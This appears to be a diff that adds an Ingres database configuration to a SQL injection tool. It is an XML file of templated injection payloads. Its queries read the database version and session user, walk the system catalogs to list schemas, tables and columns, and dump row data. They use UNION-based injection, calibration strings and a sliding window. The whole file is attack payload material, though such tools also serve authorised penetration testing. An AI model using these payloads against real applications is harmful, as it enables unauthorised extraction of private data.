@@ -1,0 +1,107 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<model>
+    <vendor></vendor>
+    <resource>
+        <info>
+SELECT 
+    dbmsinfo('_version')
+    ||'${ENCLOSE_VALUE_SQL}'
+    ||dbmsinfo('database')
+    ||'${ENCLOSE_VALUE_SQL}'
+    ||dbmsinfo('session_user')
+    ||0x01030307 r
+        </info>
+        <schema>
+            <database>
+select 
+    rr
+    ||0x01030307 r
+from(
+    select 
+        0x04
+        ||trim(t.schema_name)
+        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr
+    from
+        (select distinct schema_name from iischema)t,
+        (select distinct schema_name from iischema)t1
+    where t.schema_name>=t1.schema_name
+    group by 1
+    {limit}
+)a
+            </database>
+            <table>
+select 
+    rr
+    ||0x01030307 r
+from(
+    select 
+        0x04
+        ||trim(t.table_name)
+        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr
+    from
+        (select distinct table_name from iiingres_tables where table_owner='${DATABASE}')t,
+        (select distinct table_name from iiingres_tables where table_owner='${DATABASE}')t1
+    where t.table_name>=t1.table_name
+    group by 1
+    {limit}
+)a
+            </table>
+            <column>
+select 
+    rr
+    ||0x01030307 r
+from(
+    select 
+        0x04
+        ||trim(t.column_name)
+        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr
+    from
+        (select distinct column_name from iiocolumns where table_owner='${DATABASE}'and table_name='${TABLE}')t,
+        (select distinct column_name from iiocolumns where table_owner='${DATABASE}'and table_name='${TABLE}')t1
+    where t.column_name>=t1.column_name
+    group by 1
+    {limit}
+)a
+            </column>
+            <row>
+                <query>
+select 
+    rr
+    ||0x01030307 r
+from(
+    select 
+        0x04
+        ||trim(t.s)
+        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr
+    from
+        (select distinct ${FIELDS} s from "${DATABASE}".${TABLE})t,
+        (select distinct ${FIELDS} s from "${DATABASE}".${TABLE})t1
+    where t.s>=t1.s
+    group by 1
+    {limit}
+)a
+                </query>
+                <fields>
+                <field>trim(ifnull(varchar(${FIELD}),''))</field>
+                <concat>||0x7f||</concat>
+                </fields>
+            </row>
+        </schema>
+    </resource>
+    <strategy>
+        <configuration>
+            <slidingWindow>
+'SQLi'||substr(r,${INDEX},65536)r from(${INJECTION})
+            </slidingWindow>
+            <limit> having count(*) between ${LIMIT} and ${LIMIT}</limit>
+            <failsafe> select 1337${INDICE}7330%2b1</failsafe>
+            <calibrator>rpad('%23',1024,'%23')</calibrator>
+            <limitBoundary>1</limitBoundary>
+        </configuration>
+        <normal>
+            <indices> union select ${STARS} from(${INDICES_STARS})b</indices>
+            <capacity>'SQLi${INDICE}'||${CALIBRATOR}||'iLQS'</capacity>
+            <orderBy> order by 1337</orderBy>
+        </normal>
+    </strategy>
+</model>
